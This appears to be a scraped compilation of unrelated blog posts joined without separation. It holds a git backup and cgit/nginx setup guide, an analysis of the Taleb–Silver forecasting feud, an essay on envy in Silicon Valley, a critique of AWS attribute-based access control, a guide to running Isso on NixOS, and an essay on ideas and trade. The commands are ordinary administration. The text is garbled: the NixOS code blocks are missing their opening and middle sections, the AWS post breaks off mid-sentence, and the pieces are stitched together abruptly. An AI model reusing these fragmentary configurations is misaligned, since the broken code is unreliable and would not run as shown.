aws s3 cp ${TMPDIR}/*.git.tar.gz s3://mygitbucket/
</code></pre>

<p>If the repos are large, it might be worthwhile checking whether
the hash of the gzipped repo has changed before uploading.
It's also good idea to use <code>envdir</code> to manage the access keys rather
than putting them in the backup script.</p>
<h2>Web front-end using cgit and nginx</h2>
<p>Sometimes it's useful to view source code and commits on a
web browser. <code>cgit</code> is an awesome light-weight webapp for this.
Unlike heavy apps like GitLab, <code>cgit</code> needs no database, which
reduces the administrative burden.</p>
<p>Install cgit, nginx, fcgiwrap, and apache-tools (to create a <code>.htpasswd</code> file).</p>
<pre><code>sudo apt install cgit nginx fcgiwrap apache2-utils
</code></pre>

<p>Specify the location of the git repos and static assets in the 
<code>cgit</code> config at <code>/etc/cgitrc</code>.</p>
<pre><code>css=/cgit-static/cgit.css
logo=/cgit-static/cgit.png
favicon=/cgit-static/favicon.ico

#source-filter=/usr/lib/cgit/filters/syntax-highlighting.py

scan-path=/home/git/
</code></pre>

<p>To get syntax highlighting, install <code>python-pygments</code> and uncomment the source-filter option.</p>
<p>If you'd like to password protect access to <code>www.example.com/git/</code>, create a <code>.htpasswd</code> file:</p>
<pre><code>sudo htpasswd /etc/nginx/.htpasswd &lt;username&gt;
</code></pre>

<p>This is my <code>nginx</code> conf file to serve <code>cgit</code> from <code>www.example.com/git/</code>.</p>
<pre><code>server {
    listen 80;
    listen [::]:80;

    server_name www.example.com;

    location /.well-known/acme-challenge/ {
        root /var/www/www.example.com;
    }
    location / {
        return 301 https://www.example.com$request_uri;
    }
}

server {
    listen 443 ssl;
    listen [::]:443 ssl;

    server_name www.example.com;

    ssl_certificate /etc/letsencrypt/live/www.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/www.example.com/privkey.pem;

    location /cgit-static/ {
        alias /usr/share/cgit/;
    }

    location /cgit/ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/.htpasswd;

        include fastcgi_params;
        fastcgi_split_path_info ^(/cgit)(.*)$;
        fastcgi_param   PATH_INFO        $fastcgi_path_info;
        fastcgi_param   SCRIPT_FILENAME  /usr/lib/cgit/cgit.cgi;
        fastcgi_param   QUERY_STRING     $args;
        fastcgi_param   HTTP_HOST        $server_name;
        fastcgi_pass    unix:/var/run/fcgiwrap.socket;
    }

    location / {
        root /var/www/www.example.com;
    }
}
</code></pre>

<p>You might also want to restrict repo access to only whitelisted IPs.</p>

<p>Perhaps lost in the whirlwind of presidential name-calling, a lesser-known multi-year old feud has resurfaced on Twitter this election season. Nate Silver is the founder of <a href="https://fivethirtyeight.com/">FiveThirtyEight</a> and is a popular statistician frequently called upon by media members to give commentary and expertise on election forecasting. Nassim Taleb is a statistician/quant turned philosopher, perhaps most well known for authoring the book “The Black Swan”. He is second most well known for calling people names on Twitter. In this 2018 instance he seemed to take issue with FiveThirtyEight’s election forecasts, saying that <a href="https://twitter.com/nntaleb/status/1059202026184282113">“klueless Nate Silver” “doesn’t know how math works”</a>, among a host of other insults. Silver responded that Taleb was an <a href="https://twitter.com/NateSilver538/status/1062782704159256576">“intellectual-yet-idiot”</a>, an phrase coined by Taleb himself. Ouch. A litany of statisticans, mathematicians, and data scientists came out of the woodwork to take sides. Taleb himself <a href="https://twitter.com/nntaleb/status/1314902682570764288">doubled down</a> on Oct. 10, 2020, again calling Silver “totally clueless”.</p>

<p>In this article I take a look behind the mathematical premises of Taleb’s arguments, and give intuitive explanations of why or why not they hold up. In short, while Taleb’s math is sound, he still manages to miss the mark by ignoring the nuance of Silver’s forecasts.</p>

<p>Taleb’s main gripe is that forecasters change their opinion too much over time. Take a look at FiveThirtyEight’s forecast from the 2016 presidential election, where the probability of Clinton winning peaked at 90%, and hit a low of 50%. 
<img src="http://quant.am/assets/2016election.png" alt="2016 election"></p>

<p>Taleb insists that Clinton never should’ve received a probability of winning of 90%. Even if polls were heavily in favor of Clinton at the time, he says Silver should’ve taken into account the uncertainty that polls would change over the next few months leading up to the election, or the possibility of major news breaking. If Silver had factored in the “unknown unknowns” his forecast should’ve been closer to 50%. In essence, this single number should reflect all <em>current and future uncertainty</em>. Taleb constructs this argument by way of quantitative finance, which perhaps led to him and traditional statisticians talking past each other. In the following sections I step through his argument in intuitive terms.</p>


<p>A well known truth to economists, quants, and traders: if I tell you a number, I must be willing to transact at that number. If I tell you the fair value of this house is $500,000, I must be willing to buy AND sell at that price. Otherwise, the number I gave you is meaningless. Likewise, if I tell you the probability of Biden winning this election is 73%, I must be willing to pay $0.73 to make the following wager: if Biden wins I receive $1, if he loses I receive $0.</p>

<p>This is important because it turns the predicted probabilities into a tradeable financial instrument known as a binary option. If the prediction is 50%, I can buy the option at $0.50. If the prediction moves to 65%, I can now sell the option at $0.65, turning a $0.15 profit.</p>

<p>This brings us to another important principle known as the <em>no-arbitrage condition</em>. If the election predictions are accurate, there should be no way for a trader to make guaranteed money by trading this option. To give an illustrative example, let’s say that we live in an unchanging world where the probability of Candidate A winning is static at 50%. If a pollster does not report a static forecast day after day, he will create an arbitrage opportunity. We will sell when the prediction is above 50%, and buy below. 
<img src="http://quant.am/assets/arbitrage-pollster.jpeg" alt="Arbitrage condition"></p>

<p>OK, so now we’ve established that if an arbitrage condition exists, then the pollster is wrong and should not have made that prediction in the first place. Still, it’s not obvious that there’s an arbitrage condition within Silver’s predictions yet (remember, the trader doesn’t have access to an oracle, and only has the same information available to him as the pollster). There’s two more building blocks that we need in order to establish an arbitrage condition.</p>


<p>To paraphrase Taleb, if I tell you an event has a 0% chance of occurring, I cannot change my mind and tell you tomorrow it now has a 50% chance of occurring. Otherwise I shouldn’t have told you it has a 0% chance in the first place. Probability and confidence are inextricably linked, and the number a pollster predicts should encapsulate both. To go to the other extreme, if the uncertainty is extremely high (and therefore confidence low), <em>it does not matter what the polls today are saying</em>. I should give both candidates a 50% chance of winning, because I am admitting the extremely likely possibility that an external event will happen that will invalidate today’s polls. To put it in technical terms, maximum uncertainty implies maximum entropy, and the maximum entropy distribution on the [0, 1] interval is the uniform distribution, which has a mean at .5. The following figure (from <a href="https://arxiv.org/pdf/1703.06351.pdf">this paper</a>) shows the relationship between probability (x-axis) and volatility (y-axis) under a specific option pricing formulation.
<img src="http://quant.am/assets/confidence-probability.png" alt="Confidence vs volatility"></p>

<p>At this point we are suspecting something doesn’t look right with FiveThirtyEight’s predictions, as they seem to have both high volatility and high probability, which contradict each other. Where is the threshold though? How can we prove that the volatility is too high?</p>


<p>Now we’re going to go a little bit technical and show that a no-arbitrage condition was likely violated. The basic construction is as follows:</p>

<ol>
  <li>In order to satisfy the no-arbitrage condition, all information must be “priced in” into the pollster’s current prediction.</li>
  <li>Therefore, the time series of predictions must be a martingale.</li>
  <li>Martingales cannot show trending or mean-reverting behavior, therefore Silver’s predictions violated the martingale property, and therefore the no-arbitrage condition.</li>
</ol>

<p>The definition of a martingale is a stochastic process \(X_1, X_2, ... X_t\) that satisfies</p><p>

\[E[X_{t+1} | X_1, ... ,X_t] = X_t\]

</p><p>To quote <a href="https://www.researchgate.net/profile/Christopher_Wlezien/publication/344419648_Information_incentives_and_goals_in_election_forecasts/links/5f73c994a6fdcc0086484861/Information-incentives-and-goals-in-election-forecasts.pdf">Andrew Gelman</a>,</p>

<blockquote>
  <p>In non-technical terms, the martingale property says that knowledge of the past will be of no use in predicting the future…One implication of this is
that it should be unlikely for forecast probabilities to change too much during the campaign (Taleb, 2017). Big events can still lead to big changes in the forecast: for example, a series of polls with Biden or Trump doing much better than before will translate into an inference that public opinion has shifted in that candidate’s favor. The point of the martingale property is not that this cannot happen, but that the possibility of such shifts should be anticipated in the model, to an amount corresponding to their prior probability. If large opinion shifts are allowed with high probability, then there should be a correspondingly wide uncertainty in the vote share forecast a few months before the election, which in turn will lead to win probabilities closer to 50%.</p>
</blockquote>

<p>In other words, all information is already priced into the current market. If it were not so, a trader could make money by taking advantage of the information that is not priced in already. So last thing we need to check: is it likely that Silver’s predictions have the martingale property? It is not in dispute that the answer is no…it shows clear mean-reversion behavior and can be validated by a statistical test of the martingale hypothesis (for example, a <a href="http://www.planchet.net/EXT/ISFA/1226.nsf/9c8e3fd4d8874d60c1257052003eced6/35822efeb009804cc1257afe006b0063/$FILE/11park.pdf">Kolmogorov-Smirnov test</a>). It seems that Taleb’s math is sound here. So where did he go wrong?</p>


<p>I believe Nate Silver is answering a subtly different question with his election forecasts. Each data point that Silver produces is answering the question: <em>if the election were to happen today</em>, what is the probability of each candidate winning? I argue that this is a valid and useful formulation. To put it slightly differently: if the question is “Who will win the election on Nov. 3?”, which of the following answers is more satisfying?</p>

<ul>
  <li>“If nothing else changes between now and the election, Joe Biden has a 85% chance of winning.” (Silver’s argument)</li>
  <li>“I dunno, anything could happen between now and the election, I give neither candidate chances much more than 50%.” (Taleb’s argument)</li>
</ul>

<p>It is a valid criticism that perhaps Silver is not very clear on explaining what his numbers represent, and therefore the media misreports his predictions. Still, I wager that most people would find the first answer more useful. In this interpretation, the “financial instrument” is a binary option that expires every day. Thefore the time series of Silver’s predictions is not interpretable as a martingale, as it strings together the price of a completely different instrument every day.</p>

<p>It is also a valid criticism that Silver’s predictions prior to Nov. 3 mean absolutely nothing, whereas in the Taleb formulation it has a natural interpretation as the betting odds for each candidate. Silver has explicitly stated that he only judges his models based on his finalized prediction. To that end, his models are extremely well calibrated, i.e., when he says something has a 50% chance of happening it actually does happen 50% of the time.
<img src="http://quant.am/assets/538-calibration.png" alt="538 calibration"></p>

<p>In conclusion, Taleb and Silver should be having a philosophical debate on what pollsters’ numbers actually mean, and stay away from the useless distraction of calling each other names on Twitter.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Silicon Valley runs on envy. Envy pervades every activity here. Funding announcements, company off-sites, career promotions, introduction emails, product releases, investor pitches, board meetings, fireside chats, news stories-- all are infused with envy. Envy is the fuel that animates this place, the scaffolding that holds it upright, and the glue that keeps it together. If you could cast a spell to eliminate envy, every Silicon Valley institution would deflate and vanish, like an alien goo-monster cut off from its power source in pre-CGI horror movies.</p><p>Envy is at every step in the funnel. Founders without funding envy founders with funding. Founders with funding envy founders with funding from more prestigious investors. Founders with funding from prestigious investors envy founders who are favorites. Founders of companies with a $30B market cap envy founders of companies with a $300B market cap. VC associates envy junior partners, who envy senior partners. Investors envy other investors who have better deal flow. Tech employees envy other tech employees who get to spend more time with the senior leadership. Get a drink in a product manager, and they’ll tell you all about how the CEO plays favorites. Everyone watches each other as if it's their full time job.</p><p>I was once having a drink with a YC founder whose company was in the top ten by valuation in the YC portfolio. For a while, he was getting invited to dinners exclusive to founders in their top ten most valuable companies. Then, other companies dramatically grew in valuation, and his was pushed down the list far past the top ten. He was telling me how he envied founders who got to attend these dinners he wasn't invited to anymore. And of course I envied him because at least he got to go.</p><p>You do not talk about envy in polite company. That would puncture through a collectively agreed-upon veneer. But envy is such an important mechanism, we must talk about it. So we repackaged it as status. Envy and status aren't the same, but it doesn't matter because there are very few low-status people who don't experience envy. This linguistic trick transposes a Judeo-Christian idea into an amoral domain. It works. We can’t talk about envy, but we can safely talk about status, so long as it's in the abstract and not about a particular person.</p><p>Envy is contagious. I don't think I've ever experienced it unless I'm in an environment where I sense it from others. Then, if I'm not careful, I feel it very intensely. It's such an unpleasant sensation that I deliberately go out of my way to avoid it. The best way to avoid feeling envy is to spend time with aspy people who are unable to feel it, or with people who've accepted their lot in life. Conversely anything tech scene is a breeding ground for envy (e.g. tech press, gossip, startup parties, exclusive events). Repeatedly choosing to put yourself into situations where you feel envy has the same shape as an abusive relationship. It isn't good for you, but you keep coming back because you're too myopic to see it for what it is.</p><p>Dislike for the unpleasant sensation of being envious isn't a good reason for envy avoidance. A much better reason is that in a technologically sophisticated civilization envy is a bad north star. Consider again what you pay attention to when you adopt envy as your guide. Tech press, gossip, parties, off-sites-- almost all of it is noise, and is therefore a monumental waste of your time. And it makes you hyperactive. You become like a confused moth, abruptly changing course to follow rapidly flashing sources of light, except you aren't aware they're going on and off at random.</p><p>Conviction is a dramatically better north star than envy. It's important to meet people, but it's much better done by working toward a shared mission than by trying to wriggle your way into desirable social circles. The mission can be enormous (get to Mars) or mundane (complete a multi-day hike). Human beings form the strongest bonds when they overcome shared obstacles in pursuit of a common goal. And even if people don't join you, they are likely to remember you and respect you for attempting to accomplish a challenging mission. </p><p>Envy is a paradoxical emotion because it makes you desire things you'd be much more likely to get if you rarely felt it, or at least rarely acted on it. So if you want to acquire the objects of your envy, structure your life to avoid it as much as possible. That isn't to say envy isn't useful. Silicon Valley is built on envy, and it has accrued immense advantages-- capital, talent, networks, collective wisdom. Harness the envy of others to achieve your mission. Don’t allow others to ignite envy in you to achieve theirs.</p><p><strong>TL;DR:</strong> Spend time with people who don't feel envy. Avoid people who do. Pick a mission, and direct all your energy into solving problems that stand between you and your target. Nurture relationships by overcoming shared challenges with others. Avoid "the scene". If you were a musician, you'd want to be the type who's practicing scales rather than trying to get backstage to party with the rock stars. Find the equivalent of practicing scales in your field, and do that.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Two years ago, in November 2018, AWS <a href="https://aws.amazon.com/blogs/security/add-tags-to-manage-your-aws-iam-users-and-roles/">announced</a> new conditions keys <code>aws:PrincipalTag</code> and <code>aws:RequestTag</code>, and <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">started to push</a> the concept of Attribute Based Access Control (ABAC).  This post will describe what this is, the difficulties with implementing this strategy, and what AWS needs to do for customers to be successful with this concept.</p>


<p>A long standing problem with AWS security has been that if you had two projects in a single AWS account, it was often impossible to ensure that some principals (meaning the users and roles there) could only interact with the resources of one project and not the other.  In order to implement a least privilege strategy, you want to isolate the actions each principal can take to only certain resources to ensure they cannot impact or exfil data from the other project.</p>

<p>The solution many customers have been forced to adopt is to isolate their projects into separate AWS accounts, but that’s not always ideal. For example, it can be difficult to take an existing account and move resources into another account as an account grows.  So AWS started focusing on tagging resources and restricting access via tags.  Over time, many privileges started to be able to work with the condition key <code>aws:ResourceTag</code> so that you could restrict who could interact with an existing resource. But what if you wanted the principal to create new resources, but restrict what tags they could use, so they couldn’t create a resource with the tag of another project?  For this AWS <a href="https://aws.amazon.com/blogs/security/add-tags-to-manage-your-aws-iam-users-and-roles/">released</a> <code>aws:RequestTag</code>.</p>

<p>What if you had many principals and projects and you didn’t want to create separate IAM policies for each one? You want a single policy that you can apply to all principals that says “Only interact with resources that match the same tag as you have” or the common request of “You can only interact with resources you created.”  To implement this concept, AWS released <code>aws:PrincipalTag</code>, so you could now use a conditions such as:</p>

<pre><code>StringEquals: { "aws:RequestTag/project": "${aws:PrincipalTag/project}" }
</code></pre>

<p>Attribute-based access control (ABAC) is an authorization strategy that defines permissions based on attributes, which on AWS means tags.  Two of the best resources on this concept are <a href="https://twitter.com/bjohnso5y">Brigid Johnson’s</a> re:Inforce talk <a href="https://www.youtube.com/watch?v=Iq_hDc385t4">Scale Permissions Management in AWS w/ Attribute-Based Access Control</a> and <a href="https://twitter.com/mchancloud">Michael Chan</a>’s blog post <a href="https://aws.amazon.com/blogs/security/working-backward-from-iam-policies-and-principal-tags-to-standardized-names-and-tags-for-your-aws-resources/">Working backward: From IAM policies and principal tags to standardized names and tags for your AWS resources</a>.</p>



<h2 id="lack-of-privilege-support">Lack of privilege support</h2>
<p>The first issue people ran into with ABAC was that not all resources supported tags. Of those resources that did, not all supported IAM conditions to restrict these tags. Of those that did, not all supported tag on create, so you could only restrict access to tag existing resources, leaving resources untagged.  Let’s get some stats on how much coverage AWS has today.  Using the IAM data from <a href="https://github.com/duo-labs/parliament/blob/main/parliament/iam_definition.json">Parliament</a> (which is just the AWS <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_actions-resources-contextkeys.html">docs</a> scraped into a json file), we find there are 869 privileges that contain the word <code>create</code>, which we can assume to be the privileges that grant permission to create a resource.</p>

<pre><code>$ cat parliament/iam_definition.json | jq '.[]|.prefix as $prefix|.privileges[]|.privilege as $privilege|select($privilege|ascii_downcase|contains("create"))|$prefix+":"+$privilege'  | sort | uniq | wc -l
     869
</code></pre>

<p>Next, we’ll find all the privileges of these that allow the <code>RequestTag</code> condition key:</p>

<pre><code>$ cat parliament/iam_definition.json | jq '.[]|.prefix as $prefix|.privileges[]|.privilege as $privilege|select($privilege|ascii_downcase|contains("create")).resource_types[].condition_keys[]|select(.|ascii_downcase |contains("requesttag"))|$prefix+":"+$privilege' | sort | uniq | wc -l
     381
</code></pre>

<p>We find that 381 of 869 (43%) privileges for creating resources on AWS allows you to both tag the new resources and to restrict what tags are used for that.  This search does miss some privileges that are used to create resources but do not include the word <code>create</code>, such as <code>ec2:RunInstances</code> that lets you create an EC2 and <code>route53:ChangeResourceRecordSets</code> that lets you create a subdomain.  It also misses situations where AWS has two privileges for creating a resource, where one privilege is used for creating the resource with tags and one without, such as <code>cloudfront:CreateDistribution</code> and <code>cloudfront:CreateDistributionWithTags</code>.  However, 43% seems roughly correct.</p>

<p>One might try to argue that the more widely used resources do support tag on create and restricting those tags, but there are some popular resources that do not.  For example, the following privileges are all unable to restrict tag on create: <code>lambda:CreateFunction</code>, <code>dynamodb:CreateTable</code>, <code>kms:CreateKey</code>, <code>logs:CreateLogGroup</code>, <code>s3:CreateBucket</code>, <code>sqs:CreateQueue"</code>, and <code>iam:CreateRole</code>.</p>

<p>As a hack, for resources that don’t support tag on create, you can use the names of the resources in a similar way as a tag, but this is awkward.</p>


<p>Given a resource in an AWS account, there is not much tooling available that can tell you who all has access to it.  Some tools (ex. <a href="https://github.com/FSecureLABS/awspx">awspx</a>) will tell you who has certain privileges, but they don’t understand conditions, among other details.  So for example, they can tell you who has <code>secretsmanager:CreateSecret</code>, but they won’t tell you who can create a secret with the tag <code>foo</code>.</p>

<p>I built some functionality into <a href="https://github.com/duo-labs/cloudmapper">CloudMapper</a> through it’s <code>access_check</code> command that tries to understand more IAM logic. It has some understanding of conditions and will also take IAM Boundaries into consideration, but it does not understand the existing tags on a resource, and lacks a lot of other functionality.  Its answers will be more correct than other tools for some questions, but will still be incorrect for a lot of cases.  The project <a href="https://github.com/nccgroup/PMapper">PMapper</a> also has some additional logic in it.</p>

<h3 id="simulateprincipalpolicy">SimulatePrincipalPolicy</h3>
<p>There is an API called <a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_SimulatePrincipalPolicy.html">SimulatePrincipalPolicy</a> that can be used to understand who has access to resources, but it is missing a lot of functionality you would expect.  For example, you can pass it the ARN of a principal, the ARN of a resource, and associated privilege to check for, but if there are any conditions, you then have to also include the condition values that should be used when checking this.  This means you have to figure out the tags of the resource and the resource policy to then pass to this call.</p>

<p>So for example, assume we have a principal that can call <code>secretsmanager:GetSecretValue</code> only on secrets that have been tagged with a <code>project</code> key that has a value <code>foo</code>, and we have a secret with that tag.  In order to check if our principal can access this secret, we can run:</p>

<pre><code>aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/testuser \
  --action-names secretsmanager:getsecretvalue \
  --resource-arns arn:aws:secretsmanager:us-east-1:123456789012:secret:test-abcdef \
  --context-entries ContextKeyName=secretsmanager:ResourceTag/project,ContextKeyValues=foo,ContextKeyType=string
</code></pre>

<p>Notice in the last line, I have to tell it the value of the tag for the resource that I want it to check. The policy simulator does not figure that out for you.  So if you were to try to automate this, you would have to make a describe call, knowing where in the response to find the tag value, and how to format the call to <code>SimulatePrincipalPolicy</code> with this value.  Also, if the IAM policy has unrelated condition keys for other privileges, you have to provide context keys for those too. Next, you have to provide the resource policy if one exists, the IAM boundary if one exists, and potentially other data.</p>

<p>Because of these limitations, this API is not as useful as you might hope.</p>

<h3 id="zelkova">Zelkova</h3>
<p>Zelkova is an automated reasoning solution for IAM policies that was announced by AWS in 2017 and available for private beta.  When I talk to people about the problem of understanding who has access what, this project often comes up as a possible option by those who aren’t familiar with what exactly it does. Unfortunately, Zelkova is an engine that you still have to figure out the inputs to.  It can answer some IAM related questions, but for our goals of understanding who has access to what, it has all the same limitations as iam:SimulatePrincipalPolicy.</p>

<h2 id="limited-capabilities-of-tag-policies">Limited capabilities of Tag Policies</h2>
<p>An AWS Organization feature called <a href="https://aws.amazon.com/blogs/aws/new-use-tag-policies-to-manage-tags-across-multiple-aws-accounts/">Tag Policies</a> was supposed to help enforce tagging, but it is critically limited by only being able to enforce what tag values may be used when defined tag keys are used.  This means you cannot enforce that a resource is tagged. You can only enforce that when someone attempts to tag a resource with a certain key, that the value is one of a defined set.  In order to enforce tagging actually be used in an organization, you have to use SCPs as described <a href="https://aws.amazon.com/blogs/security/securing-resource-tags-used-for-authorization-using-service-control-policy-in-aws-organizations/">here</a>.</p>

<p><a href="https://summitroute.com/img/tag_policies_limitation.png">
<img src="https://summitroute.com/img/tag_policies_limitation.png" alt="Enforcement has no effect on resources that are created without tags." title="Enforcement has no effect on resources that are created without tags."></a></p>
<p>This warning is from the docs <a href="https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_tag-policies-enforcement.html">here</a>.</p>

<p>Further, Tag Policies do not have coverage across all resources that support tags.  The list of supported resources is <a href="https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_supported-resources-enforcement.html">here</a>.  An example of a resource that supports tags, but is not supported by Tag Policies, is S3 objects.</p>

<p>AWS needs to extend the functionality of this feature to support enforcement of using tag keys, as there is little value in it in its current form.</p>

<h2 id="lack-of-support-for-working-with-multiple-tag-values">Lack of support for working with multiple tag values</h2>
<p>People often work on multiple projects, but there is no way to tag a principal with a key that has multiple tag values.  As an example, imagine you have two projects, <code>foo</code> and <code>bar</code>, and you want to allow a person to work on just <code>foo</code> and all the resources they create should have a <code>Project</code> tag with value <code>foo</code>, and likewise you have another person who should only work on the <code>bar</code> projects.  AWS <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">has shown</a> how to create a single IAM policy that can be applied to both people, and you’d just need to make sure to apply a <code>Project</code> tag to the principals to define which project they can work on.</p>

<p>Now imagine that one of these employees needs to work on both projects. You cannot tag a principal with both <code>foo</code> and <code>bar</code>.  One solution is to have the person assume different IAM roles depending on …</p></div></div>

            <p>This short article documents how I run <a href="https://posativ.org/isso/" title="Isso: a commenting server similar to Disqus">Isso</a>, the commenting system
used by this blog, inside a Docker container on <a href="https://nixos.org/manual/nixpkgs/stable/#ssec-pkgs-dockerTools-buildImage">NixOS</a>, a Linux
distribution built on top of Nix. Nix is a declarative package
manager for Linux and other Unix systems.</p>
<hr>
<p>While NixOS 20.09 includes a <a href="https://github.com/NixOS/nixpkgs/blob/release-20.09/pkgs/servers/isso/default.nix">derivation for Isso</a>, it is
unfortunately broken and relies on Python 2. As I am also using a fork
of Isso, I have built my own derivation, heavily inspired by the one
in <a href="https://github.com/NixOS/nixpkgs/blob/master/pkgs/servers/isso/default.nix">master</a>:<sup id="fnref-alternative"><a href="#fn-alternative">1</a></sup></p>

<span>};</span>
</pre></div>

<p>I want to run Isso through <a href="https://gunicorn.org/" title="Gunicorn 'Green Unicorn': a Python WSGI HTTP Server for UNIX">Gunicorn</a>. To this effect, I build an
Python environment combining Isso and Gunicorn. Then, I can invoke the
latter with <code>"${issoEnv}/bin/gunicorn"</code>, like with a <a href="https://docs.python.org/3/tutorial/venv.html" title="Python documentation: Virtual Environments and Packages">virtual
environment</a>.</p>

      pkgs<span>.</span>python3Packages<span>.</span>gevent
    <span>];</span>
<span>};</span>
</pre></div>

<p>Before building a Docker image, I also need to specify the
Isso configuration file for Isso:</p>
<div><pre><span></span><span>issoConfig =</span> pkgs<span>.</span>writeText <span>"isso.conf"</span> <span>''</span>
<span>  [general]</span>
<span>  dbpath = /db/comments.db</span>
<span>  host =</span>
<span>    https://vincent.bernat.ch</span>
<span>    http://localhost:8080</span>
<span>  notify = smtp</span>
<span>  […]</span>
<span>''</span><span>;</span>
</pre></div>

<p>NixOS comes with a <a href="https://nixos.org/manual/nixpkgs/stable/#ssec-pkgs-dockerTools-buildImage">convenient tool to build a Docker image</a> without
a <code>Dockerfile</code>:</p>
<div><pre><span></span><span>issoDockerImage =</span> pkgs<span>.</span>dockerTools<span>.</span>buildImage <span>{</span>
  <span>name =</span> <span>"isso"</span><span>;</span>

            <span>"--workers"</span> <span>"2"</span>
            <span>"--worker-tmp-dir"</span> <span>"/dev/shm"</span>
            <span>"--preload"</span>
            <span>"isso.run"</span>
          <span>];</span>
    <span>Env =</span> <span>[</span>
      <span>"ISSO_SETTINGS=</span><span>${</span>issoConfig<span>}</span><span>"</span>
      <span>"SSL_CERT_FILE=</span><span>${</span>pkgs<span>.</span>cacert<span>}</span><span>/etc/ssl/certs/ca-bundle.crt"</span>
    <span>];</span>
  <span>};</span>
<span>};</span>
</pre></div>

<p>Because we refer to the <code>issoEnv</code> derivation in <code>config.Cmd</code>, the
whole derivation, including Isso and Gunicorn, is copied inside the
Docker image. The same applies for <code>issoConfig</code>, the configuration
file we created earlier, and <code>pkgs.cacert</code>, the derivation containing
trusted root certificates. The resulting image is 171 MB once
installed, which is comparable to the Debian Buster image generated by
the official <a href="https://github.com/posativ/isso/blob/master/Dockerfile"><code>Dockerfile</code></a>.</p>
<p>NixOS features an abstraction to run Docker containers. It is not
currently documented in NixOS manual but you can look at the <a href="https://github.com/NixOS/nixpkgs/blob/release-20.09/nixos/modules/virtualisation/oci-containers.nix">source
code of the module</a> for the available options. I choose to use
<a href="https://podman.io/">Podman</a> instead of Docker as the backend because it does not
require running an additional daemon.</p>

<p>While I still struggle with Nix and NixOS, I am convinced this is how
<strong>declarative infrastructure</strong> should be done. I like how in <a href="https://github.com/vincentbernat/nixops-take1/blob/master/isso.nix">one
single file</a>, I can define the derivation to build Isso, the
configuration, the Docker image, the container definition, and the
Nginx configuration. The Nix language is used both for <strong>building
packages</strong> and for <strong>managing configurations</strong>.</p>
<p>Moreover, the Docker image is updated
automatically like a regular NixOS host. This solves an issue plaguing
the Docker ecosystem: no more stale images! My next step would be to
combine this approach with <a href="https://www.nomadproject.io/" title="Nomad: Workload Orchestration Made Easy">Nomad</a>, a simple orchestrator to deploy
and manage containers.</p>

<p>Ideas ambulate humanity across history. A&nbsp;new and useful idea is an innova­tion, which can benefit everyone for the rest of time. There­fore, it is critical we construct socioe­co­nomic struc­tures conducive to the creation of new ideas: civiliza­tion can only advance amid an everlasting flow of fresh knowl­edge. Free trade is the means by which we maximize ideation and its physical manifes­ta­tion: wealth creation. Anything that impedes trade — like central banking — is (by defin­i­tion) a&nbsp;terrible idea. Contrarily, all accel­er­ants to free trade — like money — are among the most brilliant ideas we’ve ever had.</p>

<h2 id="e27b">Ideas Drive Economics</h2>



<blockquote><p>A pile of rocks ceases to be so when somebody contem­plates it with the idea of a&nbsp;cathe­dral in mind.</p><cite>Antoine De St-Exupery</cite></blockquote>



<p>Ideas are&nbsp;the origins of every­thing we say, do, or make. The purpose of any economy is to generate and share useful ideas through free trade (to achieve what econo­mists call the division of labor or knowl­edge special­iza­tion). Civiliza­tion emerges not by an aimless concourse of varia­tion, but rather it is molded in the image of our ideas, which we express through action to remake the face of the Earth. Better ideas, or sharper knowl­edge, equip mankind to more intel­li­gently harness the gifts of the Earth to satisfy his wants to ever-higher degrees in ever-less time. In ideolog­ical space, compe­ti­tion is free and fierce: only the most useful ideas survive the test of time. Resul­tant knowl­edge encodes the patterns of action we use to etch our imagi­na­tions into the world around us. Winning ideas are chosen by the market, only to be widely distrib­uted as material riches, finer manners and morals, and more profound art. Our lives are lived by enacting our ideas. As HG Wells said:</p>



<blockquote><p>“Human history is, in essence, a&nbsp;history of ideas.”</p></blockquote>



<p>Or as William Durant elabo­rates:</p>



<blockquote><p>History as a&nbsp;labora­tory rich in a&nbsp;hundred thousand exper­i­ments in economics, religion, liter­a­ture, science, and govern­ment — history as our roots and our illumi­na­tion, as the road by which we came and the only light that can clarify the present and guide us into the future.</p></blockquote>



<p>Pouring forth from our forebears is this civilizing heritage of ideas sharp­ened through free trade and expressed in the tools, techniques, and cultures we make for ourselves. As we trade, our ideas become better, giving every­thing we say, do, or make more want-satis­fying quali­ties. Consider how our language has evolved from grunts to enunci­a­tions, or how our behav­iors have been shaped by culture, or how our trans­porta­tion technolo­gies have progressed from wagons to airplanes. Substan­tive ingre­di­ents for all modern miracles surrounding us today have always been avail­able, but prior to their inven­tion, we simply lacked the ideas neces­sary to manifest them. As the living gener­a­tion respon­sible for ideation, our aim must be to forge our ideas into finer form for posterity: an aim we accom­plish through innova­tion.</p>



<div><p><img src="https://miro.medium.com/max/800/1*B5s5EbBW-jXsd1pxnAH5ZQ.jpeg" alt="Ideas world cloud"></p><figcaption>Ideally, our civiliza­tion is the manifes­ta­tion of our most useful ideas.</figcaption></div>



<p>Innova­tion is simply a&nbsp;recon­fig­u­ra­tion of the raw materials of nature by indexing them to our most useful idea struc­tures. Said differ­ently: creativity is taking known elements and reassem­bling them in accor­dance with new knowl­edge. Sharp­ening knowl­edge to better satisfy ourselves requires fires from the ideolog­ical colli­sions and frictions innate to trade. Trade, then, is mankind’s “meta-idea” — the gener­a­tive idea of all our best ideas. Meta (from the Greek μετά, meaning “after” or “beyond”) is a&nbsp;prefix meaning more compre­hen­sive or transcending: trade is an idea about improving ideas. It presup­poses that anyone may know something everyone else does not, incen­tivizes them to teach the rest of us, and lets us all capitalize on any such learning oppor­tu­ni­ties. Trade indicates to us whether we are ill-informed in the pursuit of a&nbsp;goal, which can save us from harm, or help us achieve it more easily. Wealth gener­a­tion is insep­a­rable from ideation: the more we know, the more effort­lessly we satisfy our (present and poten­tial future) wants through innova­tion, and the more wealth we gain. Author Matt Ridley captures the spirit of this relation­ship between free trade and innova­tion in these words:</p>

